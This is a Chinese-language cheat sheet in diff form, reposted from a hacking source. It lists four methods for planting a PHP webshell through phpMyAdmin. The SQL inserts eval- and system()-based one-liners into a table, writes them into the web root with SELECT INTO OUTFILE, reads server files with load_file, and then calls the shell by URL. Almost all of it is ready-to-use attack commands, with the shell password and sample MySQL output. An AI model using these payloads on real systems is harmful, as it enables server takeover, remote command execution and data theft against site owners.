@@ -1,0 +1,42 @@
+    黑帽看到的，觉得很好，很方便..就转过来了。整理这些文章的人真好:!开心
+    ==========================
+    归零整理：
+    方法一：
+    CREATE TABLE `mysql`.`study` (`7on` TEXT NOT NULL );
+    INSERT INTO `mysql`.`study` (`7on` )VALUES ('<?php @eval($_POST[7on])?>');
+    SELECT 7onFROM study INTO OUTFILE 'E:/wamp/www/7.php';
+    ----以上同时执行，在数据库: mysql 下创建一个表名为：study，字段为7on，导出到E:/wamp/www/7.php
+    一句话连接密码：7on
+
+    方法二：
+    读取文件内容： select load_file('E:/xamp/www/s.php');
+    写一句话： select '<?php @eval($_POST[cmd])?>'INTO OUTFILE 'E:/xamp/www/study.php'
+    cmd执行权限： select '<?php echo \'<pre>\';system($_GET[\'cmd\']); echo \'</pre>\'; ?>' INTO OUTFILE 'E:/xamp/www/study.php'
+
+
+    方法三：
+    JhackJ版本 PHPmyadmin拿shell
+
+    Create TABLE study (cmd text NOT NULL);
+    Insert INTO study (cmd) VALUES('<?php eval($_POST[cmd])?>');
+    select cmd from study into outfile 'E:/wamp/www/7.php';
+
+    Drop TABLE IF EXISTS study;
+
+    <?php eval($_POST[cmd])?>
+    --------------------------------------------------------------------------------
+    <?php @eval($_POST[cmd])?>
+
+    CREATE TABLE study(cmd text NOT NULL );# MySQL 返回的查询结果为空(即零行)。
+    INSERT INTO study( cmd ) VALUES ('<?php eval($_POST[cmd])?>');# 影响列数： 1
+    SELECT cmdFROM study INTO OUTFILE 'E:/wamp/www/7.php';# 影响列数： 1
+    DROP TABLE IF EXISTS study;# MySQL 返回的查询结果为空(即零行)。
+
+    方法四：
+    select load_file('E:/xamp/www/study.php');
+
+    select '<?php echo \'<pre>\';system($_GET[\'cmd\']); echo \'</pre>\'; ?>' INTO OUTFILE 'E:/xamp/www/study.php'
+    然后访问网站目录：http://www.xxxx.com/study.php?cmd=dir
+
+
+
